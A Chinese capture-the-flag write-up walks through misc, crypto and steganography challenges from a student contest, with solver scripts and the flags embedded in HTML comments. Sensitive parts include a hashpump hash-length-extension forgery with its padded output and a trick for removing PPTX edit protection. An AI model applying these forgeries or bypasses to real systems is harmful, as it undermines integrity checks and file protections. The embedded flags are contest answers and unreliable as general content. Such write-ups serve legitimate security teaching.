<h2 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h2><p>直接修改本地hosts文件解开，linux下修改/etc/hosts文件，添加一行数据</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">202<span class="selector-class">.119</span><span class="selector-class">.201</span><span class="selector-class">.199</span> <span class="selector-tag">welcome</span><span class="selector-class">.bxsteam</span><span class="selector-class">.xyz</span></span><br></pre></td></tr></table></figure>
<p>然后访问welcome.bxsteam.xyz即可得到flag</p>
<!-- flag{H3110_w0rld} -->
<h2 id="签到1"><a href="#签到1" class="headerlink" title="签到1"></a>签到1</h2><p>邮件查看源代码，base64解码一下即可得到flag</p>
<!-- flag{this_is_so_easy_is_it?} -->
<h2 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h2><p>按照题目要去F12转到控制台在点击网络选项卡，选择重新载入，之后再消息头中的flag字段即可看到flag</p>
<!-- flag{Linux-Centos} -->
<h2 id="超简单的密码"><a href="#超简单的密码" class="headerlink" title="超简单的密码"></a>超简单的密码</h2><p>键盘加密，低头看下键盘即可，网上也有在线解密网站</p>
<!-- flag{isee} -->
<h2 id="滑稽"><a href="#滑稽" class="headerlink" title="滑稽"></a>滑稽</h2><p>ppt伪加密，打开后提示需要输入密码，网上找到一种方法可以绕过</p>
<blockquote>
<p>破解pptx只读需要密码<br>重命名qzxdh.pptx为qzxdh.zip，解压到<strong>当前文件夹</strong>后，切换到\ppt之下，用记事本开启presentation.xml文件；<br>把<p:modifyverifier ...="">整块选中并删除，保存并关闭；<br>将文件再打包成qzxdh.zip，更名为pptx即可。<br>本文来自 qzxdh 的CSDN 博客 ，全文地址请点击：<a href="https://blog.csdn.net/qzxdh/article/details/72624298?utm_source=copy" target="_blank" rel="noopener">https://blog.csdn.net/qzxdh/article/details/72624298?utm_source=copy</a> </p:modifyverifier></p>
</blockquote>
<p>按照该方法即可打开PPT，之后拖动首页幻灯片后即可发现后面还藏着一张幻灯片，里面就有flag</p>
<!-- flag{hua_tian_xia_zhi_da_ji} -->
<h2 id="Fast-30"><a href="#Fast-30" class="headerlink" title="Fast 30"></a>Fast 30</h2><p>一道很常规的题目，就是不断把题目返回的信息在两秒之内发回去，这肯定不能人工操作，需要编程，本题需要提交的内容是header头里面的Flag字段的值，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://web.bxsteam.xyz/fast/"</span></span><br><span class="line">header = requests.get(url).headers[<span class="string">"Flag"</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">	header = requests.post(url,data=&#123;<span class="string">"key"</span>:header&#125;).headers[<span class="string">'Flag'</span>]</span><br><span class="line">	ans = requests.post(url,data=&#123;<span class="string">"key"</span>:header&#125;).text</span><br><span class="line">	<span class="keyword">if</span> <span class="string">'&#123;'</span> <span class="keyword">in</span> ans:</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<!-- cumtctf{time_1s_a_Resource} -->
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>题目给出了提示，lsb色道隐写，丢进steg里面看一下，发现rgb的每个0通道里面，图片上方都有会多出一个黑块，说明和这三个色道有关系</p>
<p><img src="cumtctf/19.png" alt=""></p>
<p>提取一下这三个色道的信息，发现时png文件头</p>
<p><img src="cumtctf/20.png" alt=""></p>
<p>提取保存为png图片是个二维码，直接扫码就可以看到flag</p>
<!-- cumtctf{1sb_i4_s0_Ea4y} -->
<h2 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h2><p>右键查看图片属性，发现在备注里面有一串字符 <code>this_is_not_password</code>，感觉这应该是压缩包密码，猜测图片中应该隐含了一个压缩包，hed软件打开图片，直接搜索 <code>504b0304</code> (zip文件头)，果然找到了，而且在右边的字符串中还看到了flag.txt字样，直接将这段提取出来，改后缀为zip，解压，提示需要密码，输入前面的字符串 <code>this_is_not_password</code> ，解压即可得到flag</p>
<!-- flag{dd22a92bf2cceb6c0cd0d6b83ff51606} -->
<h2 id="视而不见"><a href="#视而不见" class="headerlink" title="视而不见"></a>视而不见</h2><p>看了好久没思路，网上发现bmp图像的题目基本都是色道隐写的问题，于是就用stegsolve软件疯狂尝试，analyse-&gt;steteogram-&gt;solver里面修改偏移值找到了flag(233333)</p>
<p><img src="cumtctf/21.png" alt="result"></p>
<h2 id="鲨鱼的套路"><a href="#鲨鱼的套路" class="headerlink" title="鲨鱼的套路"></a>鲨鱼的套路</h2><p>打开数据包，追踪tcp流，发现如下内容</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">hello</span><br><span class="line">hehe</span><br><span class="line"><span class="selector-tag">i</span> will give you flag~</span><br><span class="line">o</span><br><span class="line">but you must tell me te<span class="selector-class">.he</span> anhhao...ao~</span><br><span class="line">woyaohuinongcun</span><br><span class="line">ok <span class="selector-tag">i</span> will give you flag~</span><br><span class="line">just revice ......<span class="selector-class">.g</span><span class="selector-class">.receive</span> it</span><br><span class="line">UEsDBBQAAAgIANeFfErNFL6kGwAAABsAAAAcAAAAaGludF9zb21lIF90aGluZ19pc19mYWtlLnR4dEvLSUyvTs5IzUuPL87IjC9JzI/PKQUyU/NqAVBLAQI/ABQACQAIANeFfErNFL6kGwAAABsAAAAcACQAAAAAAAAAIAAAAAAAAABoaW50X3NvbWUgX3RoaW5nX2lzX2Zha2UudHh0CgAgAAAAAAABABgAu7Ux1J+n0gGhDeAnl6fSAaEN4CeXp9IBUEsFBgAAAAABAAEAbgAAAFUAAAAAAA==</span><br><span class="line">~</span><br><span class="line">bye~</span><br><span class="line">o</span><br></pre></td></tr></table></figure>
<p>这段应该是base64，但是在线网站无法解码，自己尝试，发现是个压缩包，保存为zip格式</p>
<p><img src="cumtctf/22.png" alt=""></p>
<p>之后是zip伪加密</p>
<p><img src="cumtctf/23.png" alt=""></p>
<!-- flag{cheng_shi_tao_lu_shen} -->
<h2 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy crypto"></a>easy crypto</h2><p>解压之后有个morse.txt，一看就是摩斯密码，解码为 <code>keyisvigenerecipher</code> ，提到了维吉尼亚密码，直接解密flag.txt，key就是 <code>vigenerecipher</code> ，然后解码即可得到flag</p>
<!-- flag{vigenereencryptionhhh} -->
<h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><p>题目给出了代码</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">getCode</span><span class="params">(<span class="keyword">char</span> orgin)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ( key1 * (orgin<span class="number">-97</span>) + key2 ) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">&#125;</span><br><span class="line">code : joqtgyvlmcqivvvvmmmmzzzzcccciiiijjjjoooossssqqqqmmmm</span><br></pre></td></tr></table></figure>
<p>注意题目的路径其实给出了提示 <code>challenge/misc/fangshe/</code> ，最后的 <em>fangshe</em> 其实就是仿射的意思，意思是本题是一道放射密码的题目，就是位置为key1和key2的仿射加密，网上说了key1，key2的范围是小于26的，我们数论刚开始学，我也不是很理解，我个人感觉应该是由于题目的函数如果把key1和key2看做x和y的话，key1 * (orgin-97) + key2就是一条直线，那么key值大于26之后模26是会和前面重复的，这个以后学了得在研究一下，但是这题我们可尝试暴力破解，需要注意的是我之前以为题目给的code是密文，但事实上人家给的是明文，密文是flag …….</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">"joqtgyvlmcqivvvvmmmmzzzzcccciiiijjjjoooossssqqqqmmmm"</span></span><br><span class="line">ans = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> key1 <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">  <span class="keyword">for</span> key2 <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">    ans = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> cipher:</span><br><span class="line">      ans += chr((key1 * (ord(char)<span class="number">-97</span>) + key2) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> ans <span class="keyword">or</span> <span class="string">"ctf"</span> <span class="keyword">in</span> ans:</span><br><span class="line">      print(ans)</span><br></pre></td></tr></table></figure>
<p>跑完之后发现其中一个结果是</p>
<blockquote>
<p>heiboyflagisffffaaaannnnggggsssshhhheeeemmmmiiiiaaaa</p>
</blockquote>
<p>断句一下为</p>
<blockquote>
<p>hei boy,flag is ffffaaaannnnggggsssshhhheeeemmmmiiiiaaaa</p>
</blockquote>
<!-- flag{ffffaaaannnnggggsssshhhheeeemmmmiiiiaaaa} -->
<h2 id="PS-Master"><a href="#PS-Master" class="headerlink" title="PS Master"></a>PS Master</h2><p>题目提示的很明显了，和ps有关，那基本就是图层的问题了，但是题目的文件用PS无法打开，binwalk一下发现是个gif图片，修改文件后缀为gif，发现可以用PS打开，打开之后第二个图层是个二维码，但是无法扫描，因为定位块上都有个二哈</p>
<p><img src="cumtctf/35.png" alt="PS提取结果"></p>
<p>参照标准二维码可以知道，左上，右上，左下都应该是黑色的定位块，可以用win10自带的画图工具把右上的块复制到左上和左下，然后把二哈图案用黑色填充，处理之后如下，扫码可得flag</p>
<p><img src="cumtctf/36.png" alt="result"></p>
<!-- flag{hi_doge_i_am_er_ha} -->
<h2 id="传感器1"><a href="#传感器1" class="headerlink" title="传感器1"></a>传感器1</h2><p>题目提示了是第九届全国大学生信息安全竞赛，可以知道这个题目考察的是曼彻斯特编码，先将题目的16进制转为2进制，根据曼彻斯特编码规则，由低到高即01代表1，由高到低即10代表0，之后转化为16进制之后发现与题目ID不符，还需要每八位进行一下反转，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Manchester</span><span class="params">(s)</span>:</span></span><br><span class="line">    ans = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)//<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> s[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>] == <span class="string">'01'</span>:</span><br><span class="line">            ans += <span class="string">'1'</span>;</span><br><span class="line">        <span class="keyword">elif</span> s[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>] == <span class="string">'10'</span>:</span><br><span class="line">            ans += <span class="string">'0'</span>;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"error in"</span>,i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">s = <span class="string">"010101010101010101010101010101011001010101010101010110100110010101010101011010101010011010010110101010100110011001100110011001100110100101010101"</span></span><br><span class="line">p = Manchester(s)</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(p)//<span class="number">8</span>):</span><br><span class="line">    flag += p[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>][::<span class="number">-1</span>]</span><br><span class="line">print(hex(int(flag,<span class="number">2</span>)))</span><br></pre></td></tr></table></figure>
<!-- flag{FFFFFED31F645055F9} -->
<h2 id="我就想试试这个名字到底能够起多长"><a href="#我就想试试这个名字到底能够起多长" class="headerlink" title="我就想试试这个名字到底能够起多长"></a>我就想试试这个名字到底能够起多长</h2><p>下载之后丢进stegsolve里面看一下，看一下低色道，发现是504b0304(zip文件头)</p>
<p><img src="cumtctf/18.png" alt="data extract"></p>
<p>保存为zip格式，但是解压不了，WinRAR修复一下就可以解压了，将解压后的文件拖进hex里面看一下直接就看到了flag。</p>
<!-- hctf{dd0gf4c3tok3yb0ard4g41n~~~} -->
<h2 id="你的石锅拌饭"><a href="#你的石锅拌饭" class="headerlink" title="你的石锅拌饭"></a>你的石锅拌饭</h2><p>题目给出了提示信息，<strong><em>培根</em></strong>，可知是培根加密，而且题目字体用了两种字体，就更加确定了，网上查资料发现培根密码有两种加密方式</p>
<blockquote>
<p> 第一种方式：<br>    A aaaaa B aaaab C aaaba D aaabb E aabaa<br>    F aabab G aabba H aabbb I abaaa J abaab<br>    K ababa L ababb M abbaa N abbab O abbba<br>    P abbbb Q baaaa R baaab S baaba T baabb<br>    U babaa V babab W babba X babbb Y bbaaa<br>    Z bbaab</p>
<p>   第二种方式<br>    a AAAAA   g AABBA    n ABBAA   t BAABA<br>    b AAAAB   h AABBB    o ABBAB   u-v BAABB<br>    c AAABA   i-j ABAAA  p ABBBA   w BABAA<br>    d AAABB   k ABAAB    q ABBBB   x BABAB<br>    e AABAA   l ABABA    r BAAAA   y BABBA<br>    f AABAB   m ABABB    s BAAAB   z BABBB</p>
</blockquote>
<p>而本题目中说了要大写，所以使用的是第一种加密方式，把题目中正常字体写成A，斜体写成B，转换之后如下</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ABAAAABABBABBBABABABAABAABAABAAABBAAAAABAABAB</span></span><br></pre></td></tr></table></figure>
<p>对照解密即可，也可以在在线网站解密</p>
<h2 id="shark"><a href="#shark" class="headerlink" title="shark"></a>shark</h2><p>题目提示了用wireshark，是一道流量分析题目，打开之后随便浏览发现了ftp登录的信息</p>
<p><img src="cumtctf/24.png" alt="登录认证报文"></p>
<p>感觉题目应该是和ftp有关，过滤一下ftp协议</p>
<p><img src="cumtctf/25.png" alt=""></p>
<p>这就基本确定了本题就是获取这个flag.zip，直接 <code>tcp contains &quot;flag&quot;</code> ，可以看到FTP-DATA协议中传输了flag.zip的数据</p>
<p><img src="cumtctf/26.png" alt=""></p>
<p>追踪tcp流，然后可以看到文件头为504b0304，可以确定这就是我们要的flag.zip文件，但是不能直接保存，这样是打不开的，要按照原始数据保存</p>
<p><img src="cumtctf/27.png" alt="save as为flag.zip"></p>
<p>文件被加密了(不是伪加密)，需要密码，尝试前面登录ftp服务器的密码试一下，直接OK</p>
<p>解压后的图片没有显示格式，丢进16进制编辑器里面看一下，是个png图片，但是文件头不对，修复一下</p>
<p><img src="cumtctf/28.png" alt=""></p>
<p>然后保存为png图片打开就OK了</p>
<p><img src="cumtctf/29.png" alt="We are family!"></p>
<!-- flag{this_PIcTur3_1s_SO_ugly_} -->
<h2 id="学姐真美"><a href="#学姐真美" class="headerlink" title="学姐真美"></a>学姐真美</h2><p>下载之后是一张jpg图片，发现在图片尾部之后还有东西，感觉像是png图片相关的东西，因为有IHDR块，然后在下载一张png图片对着格式修复，本图只需要修复八位即可</p>
<p><img src="cumtctf/16.png" alt="repair"></p>
<p>是一张二维码，但是只有一小部分，尝试修改图片尺寸，下图中前四个字节是宽度，后四个字节是高度，直接按我的修改为正方形即可</p>
<p><img src="cumtctf/17.png" alt="repair"></p>
<!-- flag{ChaoRan_is_beautiful!!!} -->
<h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><p>哈希长度扩展攻击，和web里面的 <em>is hash safe?</em> 相同类型，所以原理就不多说了，直接上工具</p>
<figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="meta"># hashpump</span></span><br><span class="line"><span class="keyword">Input</span> Signature: <span class="number">4</span>dbe35eaea655b0a2b0d06391175b8a3</span><br><span class="line"><span class="keyword">Input</span> Data: r</span><br><span class="line"><span class="keyword">Input</span> Key <span class="keyword">Length</span>: <span class="number">18</span></span><br><span class="line"><span class="keyword">Input</span> Data to Add: snow</span><br></pre></td></tr></table></figure>
<p>得到结果</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">65710003</span><span class="keyword">c</span><span class="number">2</span>ff<span class="number">40389</span>b<span class="number">064</span>d<span class="number">3</span>a<span class="number">020487</span>bd</span><br><span class="line">r\<span class="keyword">x</span><span class="number">80</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">98</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>snow</span><br></pre></td></tr></table></figure>
<p>第一行md5提交，第二行在前面加上 <strong>cy</strong> 在将 <code>\x</code> 换成空格，字母换成16进制表示即可，最终为</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">63</span> <span class="number">79</span> <span class="number">72</span> <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">98</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">73</span> <span class="number">6</span>E <span class="number">6</span>F <span class="number">77</span></span><br></pre></td></tr></table></figure>
<p>提交即可得到flag</p>
<h2 id="大家来找茬"><a href="#大家来找茬" class="headerlink" title="大家来找茬"></a>大家来找茬</h2><p>既然说了大家来找茬，感觉图片肯定有问题，估计是两张，binwalk一下发现果然是两个，foremost分离一下，本来以为是盲水印但是发现不是，百度发现了一个compare命令，试了一下居然得到个二维码，扫码得到flag</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compare <span class="number">00000000</span><span class="selector-class">.png</span> <span class="number">00000668</span><span class="selector-class">.png</span> <span class="number">3</span>.png</span><br></pre></td></tr></table></figure>
<p><img src="cumtctf/32.png" alt=""></p>
<h2 id="据说是个签到题"><a href="#据说是个签到题" class="headerlink" title="据说是个签到题"></a>据说是个签到题</h2><p>流量分析，打开之后先过滤一下http包，只有两个http，发现其中一个请求为 <code>GET /evaltest/something/welcome/web/upload_function/upload/c2hlbGw=.php HTTP/1.1\r\n</code> ，感觉应该上传了什么东西，于是过滤tcp包 <code>tcp contains &quot;upload&quot;</code> 发现了数据传输，从第二个开始追踪tcp流</p>
<p><img src="cumtctf/15.png" alt=""></p>
<p>发现了flag，但是经过了function.py的加密，不过题目也给出了代码，所以直接用它的代码解密一下即可，但是要把密文base64解密一下，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(encrypted, passphrase)</span>:</span></span><br><span class="line">  IV = encrypted[:<span class="number">16</span>]</span><br><span class="line">  aes = AES.new(passphrase, AES.MODE_CBC, IV)</span><br><span class="line">  <span class="keyword">return</span> aes.decrypt(encrypted[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message, passphrase)</span>:</span></span><br><span class="line">  IV = message[:<span class="number">16</span>]</span><br><span class="line">  length = <span class="number">16</span></span><br><span class="line">  count = len(message)</span><br><span class="line">  padding = length - (count % length)</span><br><span class="line">  message = message + <span class="string">"\0"</span> * padding</span><br><span class="line">  aes = AES.new(passphrase, AES.MODE_CBC, IV)</span><br><span class="line">  <span class="keyword">return</span> aes.encrypt(message)</span><br><span class="line">IV = <span class="string">'YUFHJKVWEASDGQDH'</span></span><br><span class="line">a = <span class="string">"mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA=="</span></span><br><span class="line">b = base64.b64decode(a)</span><br><span class="line"><span class="keyword">print</span> decrypt(b,<span class="string">"Qq4wdrhhyEWe4qBF"</span>)</span><br></pre></td></tr></table></figure>
<h2 id="萌萌哒"><a href="#萌萌哒" class="headerlink" title="萌萌哒"></a>萌萌哒</h2><p>颜文字密码(aaencode)，在线解码一下</p>
<blockquote>
<p>alert(“3Nc0d3.txt”)</p>
</blockquote>
<p>访问一下这个txt文件，发现是brainfuck编码，之后再OOK!解码一下可以得到flag</p>
<!-- flag{My_Br@iN_is_B00m_@_@} -->
<h2 id="魂斗罗"><a href="#魂斗罗" class="headerlink" title="魂斗罗"></a>魂斗罗</h2><p>下载下来是个nes文件，要用fc模拟器打开，是个魂斗罗游戏，通关就可以得到flag，下载一个virtualnes软件即可运行，再用金手指输入一些秘籍来帮助我们通关，我只用了一个无限命的秘籍，其实用金身比较好，秘籍代码如下</p>
<p><img src="cumtctf/30.png" alt=""></p>
<p>然后开启1p模式通过即可，一共好像是8关</p>
<p><img src="cumtctf/31.png" alt=""></p>
<p>注意flag里面的字符是5不是s！</p>
<!-- hctf{ju5tf0rfun} -->
<h2 id="传感器2"><a href="#传感器2" class="headerlink" title="传感器2"></a>传感器2</h2><p>前面一道题目的加强版， 按照之前题目的步骤求一下ID值</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">45</span>psi: fffffed31f<span class="number">635055f8</span></span><br><span class="line"><span class="number">30</span>psi: fffffed31f<span class="number">425055d7</span></span><br></pre></td></tr></table></figure>
<p>可以看出有两处不同，分别是63==42，f8==d7，看了大佬的wp后得到前面的两位是与psi有关，最后两位是校验值，校验值是从ID开始的每两位相加的和模256，例如对于第一个 fe+d3+1f+63+50+55=2f8=&gt;2f8%256=f8(注意是十六进制数)。前面的与psi对应的值可以按照比例计算即psi值为30时计算方式为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># py3</span></span><br><span class="line">a = (int(<span class="string">'63'</span>,<span class="number">16</span>)-int(<span class="string">'42'</span>,<span class="number">16</span>))/<span class="number">15</span> * <span class="number">5</span></span><br><span class="line">b = int(<span class="string">'42'</span>,<span class="number">16</span>) - int(a)</span><br><span class="line">print(hex(b))</span><br><span class="line"><span class="comment"># @ans=0x37</span></span><br></pre></td></tr></table></figure>
<p>补上ID之后求校验码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">"feb757375055"</span></span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)//<span class="number">2</span>):</span><br><span class="line">    sum += int(a[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">print(hex(sum%<span class="number">256</span>))</span><br><span class="line"><span class="comment"># @ans=0xe8</span></span><br></pre></td></tr></table></figure>
<p>那么最终的明文为 <code>FFFFFEB757375055E8</code></p>
<!-- flag{FFFFFEB757375055E8} -->
<h2 id="猜猜看"><a href="#猜猜看" class="headerlink" title="猜猜看"></a>猜猜看</h2><p>题目说了是一个j开头的隐写工具，Google发现了下是jphs，下载了这个软件，可以在dos下运行</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpseek<span class="selector-class">.exe</span> guess_flag<span class="selector-class">.jpg</span> flag.txt</span><br></pre></td></tr></table></figure>
<p>提取需要密码，猜测了几次发现密码为flag，在flag.txt文件中发下了二进制文本，转为16进制看一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">""</span> <span class="comment"># 此处应为flag.txt中的二进制串</span></span><br><span class="line">hex_s = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)//<span class="number">8</span>):</span><br><span class="line">    hex_s += hex(int(s[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>],<span class="number">2</span>))[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">print(hex_s)</span><br></pre></td></tr></table></figure>
<p>在线解码为字符串</p>
